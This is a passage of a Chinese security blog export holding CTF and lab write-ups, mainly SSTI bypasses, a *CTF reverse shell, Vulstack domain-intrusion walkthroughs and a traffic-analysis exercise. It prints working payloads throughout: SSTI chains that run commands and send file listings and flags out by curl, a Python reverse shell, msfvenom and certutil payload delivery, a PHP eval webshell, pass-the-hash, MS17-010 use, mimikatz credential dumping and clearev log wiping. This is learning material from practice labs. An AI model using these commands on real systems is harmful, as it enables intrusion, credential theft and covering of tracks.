_method&#x27;:&#x27;__construct&amp;filter%5B%5D=system&amp;get%5B%5D=cat+%2Fflag&amp;method=get&#x27;&#125;for port in range(9001,9051): urls=str(url+str(port)+rest) response=requests.post(url=urls,data=data) print (response.text) 攻击在拿到一个并且唯一一个payload后，由于没有编写出批量利用脚本，遂考虑手动打，导致的得分缓慢。 弱点4临场脚本编写能力欠缺 在编写脚本的过程中，需要用到对html标签解析的库（叫啥忘了）、多线程（批量getflag和提交flag），但由于很久没写多线程了，所以忘了多线程咋用了。。而且解析html标签还是大二学爬虫的时候写的，太过久远，也搞忘记了。所以最后脚本也没跑起来，耽误了太多时间。 弱点5对AWD赛制不熟悉，机器至少down了三分之一的比赛时间，5分钟一轮，一轮掉100分。我说怎么越交flag分越少。。绝了。 反思与改进提升脚本编写能力不说了。多写多看多寻思 多借鉴别人的思路，掌握基本库的用法。 先把多线程和xpath解析学会了！！！ 提升payload熟练度要求平时复现过程中不能拿到直接打，要分析原理与利用链。 提升运维水平赛前看到了安恒低权限EDR，但是部署起来看起来麻烦，就没搞，但是流量监控脚本也没挂上去，以后需要提前部署并实践相关脚本与环境。 控制好相关文件的读写权限等。 提升应急反应能力要通过流量脚本观察是否有入侵与挂马行为，学会如何处理不死马等紧急情况。 提升反制能力要能通过别人打的payload反打别人 完善武器库多收集webshell查杀工具、积累webshell免杀方式、收集常见漏洞EXP。","categories":[],"tags":[{"name":"awd","slug":"awd","permalink":"https://polosec.github.io/tags/awd/"}]},{"title":"智慧曲园自动签到+微信推送","slug":"server酱实现签到提醒","date":"2021-01-19T14:11:27.000Z","updated":"2021-01-19T12:21:05.000Z","comments":true,"path":"2021/01/19/server酱实现签到提醒/","link":"","permalink":"https://polosec.github.io/2021/01/19/server%E9%85%B1%E5%AE%9E%E7%8E%B0%E7%AD%BE%E5%88%B0%E6%8F%90%E9%86%92/","excerpt":"","text":"智慧曲园自动签到https://github.com/polosec/qfnuAutoTemperatureSubmit 使用方法： 首先安装环境依赖 pip3 install requests 将该脚本上传至服务器 （我的路径是/root） 新建脚本 auto.sh 1python3 /root/demo1.py xxxxx xxxxxxx &gt;1.txt ; python3 /root/serverjiang.py 新建定时任务 crontab -e 1 0 * * * /root/auto.sh 每天凌晨0点1分自动执行 /root/auto.sh 这条命令 绑定server酱在server酱绑定微信后，拿到key，放到下面脚本 yourkey 这个地方。 serverjiang.py: 1234567891011#!/usr/bin/env pythonimport requests,jsonurl=&quot;http://sc.ftqq.com/yourkey.send?text=&quot;data=open(&#x27;1.txt&#x27;).readline()data=json.loads(data)data=data[&#x27;message&#x27;]text=str(data)desp=&quot;success&quot;url=url+text+&quot;&amp;desp=&quot;+despr=requests.get(url=url).text 运行结果每天0点1分自动提交体温上报请求，并且将返回的信息（成功/错误）","categories":[],"tags":[]},{"title":"XCTF/*CTF web4","slug":"XCTF-CTF-web4","date":"2021-01-18T11:51:30.000Z","updated":"2021-01-18T12:26:01.000Z","comments":true,"path":"2021/01/18/XCTF-CTF-web4/","link":"","permalink":"https://polosec.github.io/2021/01/18/XCTF-CTF-web4/","excerpt":"","text":"上周末刚结束了*ctf的比赛，又摸鱼了。。赛后看雪宝的wp复现出来的，发现是socket写的有点问题 搞到夜里三点也没搞出来 wtcl oh my socket题目分析： 直接给了一堆docker 先跑起来看看是什么 docker-compose up -d 跑起来了三个容器 分别是 server client webserver 先整理下网络环境情况： webserver 172.21.0.4 server 172.21.0.2 client 172.21.0.3 首先访问webserver 123456789101112131415161718192021222324252627282930313233from flask import Flask, render_template, requestfrom subprocess import STDOUT, check_outputimport osapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index(): return open(__file__).read()@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def upload_file(): if request.method == &#x27;GET&#x27;: return render_template(&#x27;index.html&#x27;) elif request.method == &#x27;POST&#x27;: f = request.files[&#x27;file&#x27;] f.save(os.path.join(f.filename)) try: output = check_output([&#x27;python3&#x27;, f.filename], stderr=STDOUT, timeout=80) content = output.decode() except Exception as e: content = e.__str__() os.system(&#x27; &#x27;.join([&#x27;rm&#x27;, f.filename])) return contentif __name__ == &#x27;__main__&#x27;: app.run(port=5000, host=&#x27;0.0.0.0&#x27;) 通过对源码进行审计 发现上传文件后会执行文件里面的内容，于是尝试反弹shell，上传如下脚本： 这里请注意理解该段代码的作用，和bash -i那个的原理相似，都是将std out std in std err重定向至socket。 详细的分析链接放在了最后面 12345678import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&quot;ip&quot;,6666))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2) p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]) 本地监听搞起来，然后上传，得到反弹过来的shell 下面审计server.py 123456789101112131415161718192021222324252627282930313233343536373839404142from socket import *from time import ctimeimport timeHOST = &#x27;172.21.0.2&#x27;PORT = 21587BUFSIZ = 1024ADDR = (HOST, PORT)tcpSerSock = socket(AF_INET, SOCK_STREAM)tcpSerSock.bind(ADDR)tcpSerSock.listen(5)cnt = 0while True: print(&#x27;waiting for connection...&#x27;) tcpCliSock, addr = tcpSerSock.accept() cnt += 1 print(&#x27;...connnecting from:&#x27;, addr) try: while True: data = tcpCliSock.recv(BUFSIZ) if not data: break if data == b&#x27;*ctf&#x27;: content = open(&#x27;oh-some-funny-code&#x27;).read() tcpCliSock.send((content.encode())) else: tcpCliSock.send((&#x27;[%s] %s&#x27; % (ctime(), data)).encode()) except Exception as e: pass if cnt &gt;= 2: time.sleep(120) tcpSerSock.close() exit(0)tcpSerSock.close() 得到flag的条件是发送的数据为b’*ctf’ 发现这个socket写的有些问题，连接大于2时就断开了，所以需要尝试自己写个socket连进去，防止别人在连，要一直循环。 于是得到如下client的脚本： 123456789101112131415161718from socket import *HOST=&#x27;172.25.0.2&#x27;PORT=21587BUFSIZ=1024ADDR=(HOST,PORT)tcpCliSock = socket(AF_INET, SOCK_STREAM)tcpCliSock.connect(ADDR)while True: data=b&#x27;*ctf&#x27; if not data: break tcpCliSock.send(data) data = tcpCliSock.recv(BUFSIZ) if not data: break print(data)tcpCliSock.close() 但是有个问题，题目的服务器每两分钟重启一次，拿到shell后再装vim什么的太慢了，于是将脚本base64编码， echo base64_encoded_script | base64 -d &gt;1.py 以这种方式将脚本内容上传至webserver，python3 1.py执行即可。 我认为client.py 和client的容器是起迷惑作用 或者说是模拟别人在向server发送请求，所以在本地模拟时把client容器down掉就可以了。 为了验证这里一理论，我在题目的在线环境中通过webserver打到client服务器进行了LFI，发现并没有client.py，我认为上述说法成立。 总结当前还有个问题就是不知道是哪句话实现了删除文件前执行了文件里的内容。 参考链接： 雪宝wp https://blog.csdn.net/weixin_30526593/article/details/98650248","categories":[],"tags":[]},{"title":"近期ssti题目总结","slug":"近期ssti","date":"2020-12-22T07:35:19.000Z","updated":"2021-01-06T13:34:04.000Z","comments":true,"path":"2020/12/22/近期ssti/","link":"","permalink":"https://polosec.github.io/2020/12/22/%E8%BF%91%E6%9C%9Fssti/","excerpt":"","text":"分析下近期做过的ssti题目的思路 你的名字 题目分析打开题目 发现输入名字 尝试输入4 报了一个php的错误 继续尝试 1&#123;% print 2*5 %&#125; 成功. 下面将尝试利用ssti进行文件读取/命令执行 尝试 1&#123;%print config%&#125; 失败，返回值为空 尝试多个关键字后，发现是对黑名单关键词采取了置空的方法进行过滤，那么可以考虑在关键字中加入另一个关键字的方式，如 iconfigf 代表if。 首先获得所有子类 payload： 1&#123;% print &#x27;&#x27;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()%&#125; 拿到所有子类后，查找init global存在os模块的类，常见的是catch_warnings类 我这里用的是笨方法，将所有的子类打印出来后放到sublime里面找到的catch_warings类的下标为59 下面将进一步利用该类实现命令执行。 1234567&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche%&#125;&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche.oconfigs.popconfigen(&#39;curl 172.16.157.75:7777 -d &#96;ls &#x2F; |base64&#96; &#39;)%&#125;通过curl外带命令执行的结果,获得了外带的根目录ls的结果，发现了flag的存放位置，直接getflag。&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche.oconfigs.popconfigen(&#39;curl 172.16.157.75:7777 -d &#96;tail &#x2F;flag_1s_Hera|base64&#96;&#39;)%&#125; 题外话介绍popen的用法 popen方法在os模块下，使用前需要import os popen是从一个命令打开一个管道，返回值意味着执行结果，正常执行的话返回值为0 popen在ssti中常作为替代system进行命令执行的一种方式，现演示popen用法 在此例中可以看到，调用os.popen.read()方法会返回执行系统命令的结果，而不是执行成功的返回值0 popen方法中subprocess模块下也有。 安洵杯 normal_ssti首先看过滤了哪些关键字 使用burp fuzz关键字，发现过滤了很多的关键字 1首先看过滤了&#123;&#123;,可以使用&#123;%print%&#125; 的方式执行表达式 过滤了空格，可以用小括号的方式绕过 1&#123;%print(1)%&#125; 这里还过滤了. 可以用a t t r()绕过 其他的关键字可以考虑使用unicode编码绕过 lipsum方法globlas-builtins中存在os模块，可以直接执行命令。 首先构造未编码payload： 1&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;whoami&quot;)|attr(&quot;read&quot;)())%&#125; 然后构造编码payload： 1234567http:&#x2F;&#x2F;localhost:5050&#x2F;test?url&#x3D;&#123;%print(lipsum|attr(&quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f&quot;)(&quot;\\u006f\\u0073&quot;)|attr(&quot;\\u0070\\u006f\\u0070\\u0065\\u006e&quot;)(&quot;\\u0077\\u0068\\u006f\\u0061\\u006d\\u0069&quot;)|attr(&quot;\\u0072\\u0065\\u0061\\u0064&quot;)())%&#125;接下来尝试读取flag：&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat&lt;&gt;&#x2F;flag&quot;)|attr(&quot;read&quot;)())%&#125;http:&#x2F;&#x2F;localhost:5050&#x2F;test?url&#x3D;&#123;%print(lipsum|attr(&quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f&quot;)(&quot;\\u006f\\u0073&quot;)|attr(&quot;\\u0070\\u006f\\u0070\\u0065\\u006e&quot;)(&quot;\\u0063\\u0061\\u0074\\u0020\\u002f\\u0066\\u006c\\u0061\\u0067&quot;)|attr(&quot;\\u0072\\u0065\\u0061\\u0064&quot;)())%&#125; 另一种思路看了师傅们的解法，我在尝试另一种编码绕过的方式解决这个问题 12345payload1:http:&#x2F;&#x2F;127.0.0.1:5050&#x2F;test?url&#x3D;&#123;%print(1|attr(%22\\137\\137class\\137\\137%22)|attr(%22\\137\\137mro\\137\\137%22)|attr(%22\\137\\137\\147etitem\\137\\137%22)(1)|attr(%22\\137\\137subclasses\\137\\137%22)()|attr(%22\\137\\137\\147etitem\\137\\137%22)(186)|attr(%22\\137\\137init\\137\\137%22)|attr(%22\\137\\137\\147lobals\\137\\137%22)|attr(&quot;\\137\\137\\147etitem\\137\\137&quot;)(&quot;sys&quot;)|attr(&quot;modules&quot;)|attr(&quot;\\137\\137\\147etitem\\137\\137&quot;)(&quot;os&quot;)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)())%&#125;payload2:http:&#x2F;&#x2F;127.0.0.1:5050&#x2F;test?url&#x3D;&#123;%print(a|attr(%22\\137\\137init\\137\\137%22)|attr(%22\\137\\137\\147lobals\\137\\137%22)|attr(%22\\137\\137\\147etitem\\137\\137%22)(%22sys%22)|attr(%22modules%22)|attr(%22\\137\\137\\147etitem\\137\\137%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)())%&#125; 上述两种方法是通过找sys模块中的os进行命令执行。（膜一下师傅：） nctf 2020 ssti1blacklist = [&#x27;%&#x27;,&#x27;-&#x27;,&#x27;:&#x27;,&#x27;+&#x27;,&#x27;class&#x27;,&#x27;base&#x27;,&#x27;mro&#x27;,&#x27;_&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;init&#x27;,&#x27;global&#x27;,&#x27;.&#x27;,&#x27;\\&#x27;&#x27;,&#x27;req&#x27;,&#x27;|&#x27;,&#x27;attr&#x27;,&#x27;get&#x27;] 懒了，改一下上题的blacklist继续跑（doge 先用bp fuzz一下，发现过滤了很多关键字。 根据上题思路，尝试unicode绕过对关键字的过滤，如 class -&gt; \\u0063\\u006c\\u0061\\u0073\\u0073 这种方法可以成功bypass。 官方wp的方法是用十六进制绕过，也是可以的，下面是用16进制绕过的pld： 1http://10.90.89.27:5050/test?url=&#123;&#123;%22%22[%22\\x5f\\x5fcla%22+%22ss\\x5f\\x5f%22][%22\\x5f\\x5fmr%22+%22o\\x5f\\x5f%22][1][%22\\x5f\\x5fsubcla%22+%22sses\\x5f\\x5f%22]()[186][%22\\x5f\\x5fin%22+%22it\\x5f\\x5f%22][%22\\x5f\\x5fgloba%22+%22ls\\x5f\\x5f%22][%22sys%22][%22modules%22][%22os%22][%22popen%22](%22cat%3C%3E/flag%22)[%22read%22]()&#125;&#125; unctf2020 sstiblacklist: 1[ ] &#x27; &quot; _ 绕过方法： 123[] : __getitem__&#x27;和&quot;: request.args.xxx_: |attr() 1Payload:http://192.168.0.116:5000/?url=&#123;&#123;()|attr(request.args.class)|attr(request.args.mro)|attr(request.args.getitem)(1)|attr(request.args.subclass)()|attr(request.args.getitem)(186)|attr(request.args.init)|attr(request.args.globals)|attr(request.args.getitem)(request.args.sys)|attr(request.args.mod)|attr(request.args.getitem)(request.args.os)|attr(request.args.popen)(request.args.whoami)|attr(request.args.read)()&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;getitem=__getitem__&amp;&amp;subclass=__subclasses__&amp;init=__init__&amp;globals=__globals__&amp;sys=sys&amp;mod=modules&amp;os=os&amp;popen=popen&amp;whoami=whoami&amp;read=read nctf 2020 你就是我的master吗blacklist： 1&#x27; . _ class base subclasses request 绕过方法: 1234&#x27; : &quot;&quot;. :[&quot;xxx&quot;] _:八进制 十六进制 Unicode 绕过 八进制如\\137关键字： 字符串拼接 如 &quot;cla&quot;+&quot;ss&quot; Payload: 12http://192.168.1.103:5000/?url=&#123;&#123;0[&quot;\\137\\137cla&quot;+&quot;ss\\137\\137&quot;][&quot;\\137\\137mro\\137\\137&quot;][1][&quot;\\137\\137subclas&quot;+&quot;ses\\137\\137&quot;]()[186][&quot;\\137\\137init\\137\\137&quot;][&quot;\\137\\137globals\\137\\137&quot;][&quot;sys&quot;][&quot;modules&quot;][&quot;os&quot;][&quot;popen&quot;](&quot;ls&quot;)[&quot;read&quot;]()&#125;&#125; 总结flask/jinja2渲染殷勤的ssti问题考察更多的是对builtins函数/模块的使用以及了解程度，各种绕过过滤技巧 换而言之是对python语言基础语法的理解程度和面向对象思想的熟练程度。","categories":[],"tags":[]},{"title":"VULSTACK 红队评估(二) ","slug":"VULSTACK-红队评估-二","date":"2020-12-16T09:28:02.000Z","updated":"2020-12-16T09:30:37.000Z","comments":true,"path":"2020/12/16/VULSTACK-红队评估-二/","link":"","permalink":"https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/","excerpt":"","text":"Vulstack红队评估（二）环境配置踩坑webserver一开始用默认密码上不去，这里的解决方案是登录administrator账户，然后修改密码。 部署网络新建一个VMNET，编号为1，模式为hostonly，模拟内网环境，网段为10.10.10.0/24 NAT网段为192.168.111.0/24 DC(内网) 网卡选择VMNET1，IPV4地址为 10.10.10.10 WIN7(内网) 网卡选择VMNET1，IPV4地址为 10.10.10.20 WEBSERVER（内外网） 网卡1选择VMNET1，IPV4地址为10.10.10.80，网卡2选择NAT，DHCP auto configuration，本次地址为192.168.111.128 服务在C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\bin目录下存在三个批处理文件setDomainEnv，startManagedWebLogic，stopManagedWebLogic。点击配置weblogic环境。 启动服务后，访问web服务器ip:7001/console即可自动部署。 web打点进入weblogic页面后首先尝试弱口令weblogic/weblogic，登陆不进去，考虑使用weblogic扫描器。 通过扫描发现了CVE-2019-2725漏洞，尝试利用。 利用工具： https://github.com/TopScrew/CVE-2019-2725 这个脚本有个问题，明明import了sys，requests等，但是运行的时候还是会报没有import，很奇怪，把它放到if name=main里面就好了（这里大概率是name==main带来的执行顺序的问题） 顺利运行脚本后，即可获得一个webshell，地址为： http://192.168.111.128:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=ipconfig 先用webshell查看systeminfo,发现为64位操作系统，尝试使用msfvenom生成64位的reverse shell msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.111.129 lport=4444 a- x64 -f exe &gt;/root/Desktop/shell.exe kali启动apache服务，并将webshell放到/var/www/html目录下 利用Windows自带的工具 certutil下载webshell certutil.exe -urlcache -split -f http://192.168.111.129/shell.exe 但是不行，直接被360干掉了。 使用java反序列化终极测试工具直接上传冰蝎shell，目录为 1C:\\Oracle\\Middleware\\wlserver_10.3\\server\\lib\\consoleapp\\webapp\\framework\\skins\\wlsconsole\\images\\shell.jsp 可以直接连上~ 下面将shell反弹到msf上，进行下一步的渗透。 内网信息搜集在meterpreter里面使用run get_local_subnets 获取服务器网卡信息 看到10网段，添加10网段路由： run autoroute -s 10.10.10.0/24 然后启动socks代理 我这里对代理的理解是在msf启动socks5代理后，设置监听IP与端口，任何使用proxychains进行的动作都会转发到设置好的监听与端口上，与此同时msf设置了通往靶机内网的路由，便可将请求通过（命令）内网主机发送出去。 看一下net user /domain 发现了域内有五个用户 查询域控 1net group &quot;Domain Controllers&quot; &#x2F;domain 通过ipconfig /all查询IP地址与DNS服务器地址（一般DNS服务器地址是DC） 使用net config workstation 查询工作站情况 可以确定，当前域为de1ay.com 接下来使用ladon探测内网主机存活情况 利用失败，无回显，在虚拟机查看发现被360拦截掉了。 由于java的meterpreter没有mimikatz模块，所以这里尝试上传Windows的shell并且加载mimikatz模块。（忘记了之前生成的shell被干掉了。。没办法，尝试免杀） 使用go免杀cs成功了，成功上线 接下来尝试添加管理员用户 net user polosec admin@123 /add net localgroup Administrators polosec /add 由于360拦截 添加失败。 通过漏洞进行权限提升，拿到一个system权限的shell。 探测域内存活主机将cs会话派生给msf 首先CS新建一个foreign listener，选择https，记住设置的端口号和hsot。 msf一样的配置 注意这里一定要选reverse http 否则meterpreter会die 使用如下命令用ICMP协议探测主机存活： 12for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL&#x3D;&quot; 使用arp -a 查看arp缓存 确定主机大概为: 10.10.10.10(DC), 10.10.10.80, 10.10.10.201 目前10.10.10.80已经被拿下，下面尝试对10.10.10.10以及10.10.10.201主机进行渗透。 渗透域内主机通过PASS THE HASH 的方式传递NTLM hash实现上线DC和域内主机。 具体方法： 在CS中 view target -add 添加DC的IP，点击jump ，PS EXEC ，选择一个同域的账号密码进行PTH，即可顺利上线DC。 上线DC后再用mimikatz抓一下密码，然后利用同样的方法上线主机10.10.10.201。 顺利上线主机10.10.10.201： 总结通过本次对vulstack靶场的学习， 进一步了解了CS MSF的用法，加深了对bypass uac 、提权的认识，学习了初步的免杀技巧； 学会了在msf中如何配置路由对内网进行扫描，学习了几个常用的提权方式 比如MS14058 MS15051； 使用pth的方式上线域内主机等等。。 目前存在的问题也非常多，包括不太了解CS，CS的shell掉线不知道是什么问题，以及还有很多很多现在还没有学习到的知识。 针对当前问题的学习目标：了解PTH，掌握mimikatz的用法，了解如何bypass uac，认识更多的提权方法。","categories":[],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://polosec.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"vulstack 红队评估(一) 内网渗透","slug":"vulstack-红队评估-一-内网渗透","date":"2020-12-03T10:04:01.000Z","updated":"2020-12-03T10:07:03.000Z","comments":true,"path":"2020/12/03/vulstack-红队评估-一-内网渗透/","link":"","permalink":"https://polosec.github.io/2020/12/03/vulstack-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/","excerpt":"","text":"vulstack 红队评估（一）前言这是我第一次做内网渗透的相关内容，做一个学习记录。 准备工作下载镜像，虚拟机默认密码hongrisec@2019，登陆后有两台需要改密码，注意密码的格式。。别忘了再重装– 我的密码是 对网络的部署需要一定的计算机网络基础知识。 kali 网卡： NAT web服务器（DMZ区）： 网卡1 NAT 网卡2 VMNET1（hostonly） 内网服务器1（域控） 网卡 VMNET1 hostonly 内网服务器2 ： 网卡 VMNET1 hostonly 部署好后由于Windows7开了防火墙，可以向外ping但是ping不动该机器，用两台内网主机ping一下试试能不能ping动。 正常情况下 主机可以ping通两台内网主机，win7可以ping通两台内网主机，kali可以ping通win7。 web渗透工作开局phpstudy探针，猜一猜数据库账号密码root/root phpmyadmin默认路径，日进去尝试写日志getshell。 首先看看是否开日志了 SHOW VARIABLES LIKE ‘%general%’ 没开，开一下。 set golbal general_log=on; 设置下日志路径（探针中查看） 1set global general_log_file &#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;2.php&#39;; 接下来查询一下，内容是shell。 1select &#39;&lt;?php eval($_POST[a]); ?&gt;&#39;; 之后访问蚁剑链接shell就可以了 连上shell后whoami一下，发现是administrator权限，在GOD域下(?对域的概念还不太了解) 接下来使用msfvenom生成shell连接。 123456msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.54.2 lport&#x3D;5555 -f exe&gt;shell.exeuse exploit&#x2F;multi&#x2F;handler set payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.54.2set lport 5555exploit 在蚁剑执行exe文件即可获得反弹shell 不太会用msf，执行命令一直啥都没有，最后知道msf有一套自己的命令，输入shell后获得了靶机的shell。 12run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp启用RDP登录。 接下来尝试上传cs 的beacon。 cs首先设置listener，生成Windows的32位可执行程序 a.exe 通过msf的meterpreter上传到目标主机并执行 upload /root/Desktop/1.exe execute -f 1.exe 之后在cs可以看到服务器上线。 msf meterpreter 简介 Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。 最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。其中，攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现的meterpreter作为后渗透模块有多种类型，并且命令由核心命令和扩展库命令组成，极大的丰富了攻击方式。 需要说明的meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令。 连上vpn又在内网中使用psexec和bind_tcp的时候经常会出现这种情况 内网信息搜集在cs中尝试使用mimikatz获取登录的用户名和密码 使用ladon扫描内网 得到结果： 192.168.52.3 139 445 3389 192.168.52.138 80 445 139 389 192.168.52.141 21 139 192.168.52.138主机389端口开启了LDAP服务，可能是DC。 下面尝试添加路由，使用Windows7作为跳板机访问Windows2003 经尝试后可以ping通，可以顺利访问。 渗透域内成员141使用nmap对目标主机进行扫描，尝试扫描SMB漏洞 发现漏洞，尝试利用 成功获取目标机器的shell。 load mimikatz mimikatz_command -f samdump::hashes 获取主机的密码，这样就成功抓到了主机的用户名和NTML-hash值。 渗透域控使用nmap对目标ip进行扫描，发现MS17-010和MS08-067漏洞，这次尝试利用MS17-010进行攻击。 首先关闭防火墙 1234use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_commandset rhosts 192.168.52.138set command &quot;netsh advfirewall set allprofiles state off&quot;exploit 接下来获得一个正向shell 1234use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexecset rhosts 192.168.52.138set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcpexploit 之后我用mimikatz抓密码出了点问题，报错mod_process::getVeryBasicModulesListForProcess : (0x0000012b) 搜了搜这个问题是因为mimikatz默认加载32位系统，但是我们的系统是64位的，所以首先要将meterpreter迁移到一个64位进程上。 PS一下，选择权限为NT AUTHORITY\\SYSTEM权限的进程 migrate pid 即可。 之后在用mimikatz抓密码就能抓到了。 攻击结束后使用clearev命令清除攻击痕迹。 总结第一次完整地做内网渗透相关的练习，对内网渗透的过程不太熟悉，工具的使用也不熟悉，对一些概念性的基础问题也不太熟悉。。。希望能在后续的学习过程中不断完善这些方面。 参考链接https://shavchen.github.io/vulstack-1-writeup/#%E6%B8%97%E9%80%8F%E5%9F%9F%E6%8E%A7 https://www.freebuf.com/column/230476.html https://www.cnblogs.com/wkzb/p/12358076.html#scroller-14","categories":[],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://polosec.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"comprehensive traffic analysis","slug":"comprehensive-traffic-analysis","date":"2020-11-30T07:58:16.000Z","updated":"2020-11-30T07:59:52.000Z","comments":true,"path":"2020/11/30/comprehensive-traffic-analysis/","link":"","permalink":"https://polosec.github.io/2020/11/30/comprehensive-traffic-analysis/","excerpt":"","text":"题目2019.8 安恒流量分析 某公司内网网络被黑客渗透，请分析流量，给出黑客使用的扫描器 某公司内网网络被黑客渗透，请分析流量，得到黑客扫描到的登陆后台是(相对路径即可) 某公司内网网络被黑客渗透，请分析流量，得到黑客使用了什么账号密码登陆了web后台(形式:username/password) 某公司内网网络被黑客渗透，请分析流量，得到黑客上传的webshell文件名是，内容是什么,提交webshell内容的base编码 某公司内网网络被黑客渗透，请分析流量，黑客在robots.txt中找到的flag是什么 某公司内网网络被黑客渗透，请分析流量，黑客找到的数据库密码是多少 某公司内网网络被黑客渗透，请分析流量，黑客在数据库中找到的hash_code是什么 某公司内网网络被黑客渗透，请分析流量，黑客破解了账号&#105;&#x6a;&#x6e;&#117;&#64;&#x74;&#101;&#x73;&#116;&#46;&#x63;&#x6f;&#109;得到的密码是什么 某公司内网网络被黑客渗透，请分析流量，被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip 某公司内网网络被黑客渗透，请分析流量，黑客使用了什么账号登陆了mail系统（形式: username/password） 某公司内网网络被黑客渗透，请分析流量，黑客获得的vpn的ip是少 题目分析1.观察12281号包，看HTTP层的referrer，发现了AWVS的扫描器特征。 2.过滤http协议，发现/admin/login.php 3.过滤http协议，看86号包，发现了表单数据 username 人事 password hr123456（错误答案） 302跳转代表登陆成功 使用http contains “rec=login” and http.request.method==POST and ip.src==192.168.94.59 语句对webone进行过滤，将结果对时间进行排序，发现最后一个包中的username admin password admin!@#pass123 4.a.php 翻到最后发现了a.php 然后分组列表搜a.php 找POST包 Form item: “action” = “QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJb 使用 http contains “&lt;?php @eval” 过滤找一句话木马，但是没找到。 考虑TCP 重传可能导致http没追踪到，所以考虑使用tcp contains “&lt;?php @eval” 发现了 1&lt;?php @eval($_POST[1234]);?&gt; 将其base64encode即可。 1PD9waHAgQGV2YWwoJF9QT1NUWzEyMzRdKTs&#x2F;Pg&#x3D;&#x3D; 5.搜字符串robots.txt 发现flag flag:87b7cb79481f317bde90c116cf36084b 6.找到webshell的名称后，一直跟踪webshell，看看她在做什么。数据包大概在734581。 后面会发现查看了数据库配置文件，就发现了数据库账号密码 dbuser web dbpass e667jUPvJjXHvEUv 7.在web2数据包中 过滤mysql协议 分组字节流搜索字符串hash_code 看response包发现hash_code d1c029893df40cb0f47bcf8f1c3c17ac 8.web2数据包中 过滤mysql协议 搜索字符串 &#105;&#x6a;&#x6e;&#x75;&#64;&#x74;&#x65;&#115;&#x74;&#46;&#x63;&#x6f;&#x6d; ，看到md5加密的密码b78f5aa6e1606f07def6e839121a22ec，解密一下得到edc123!@# 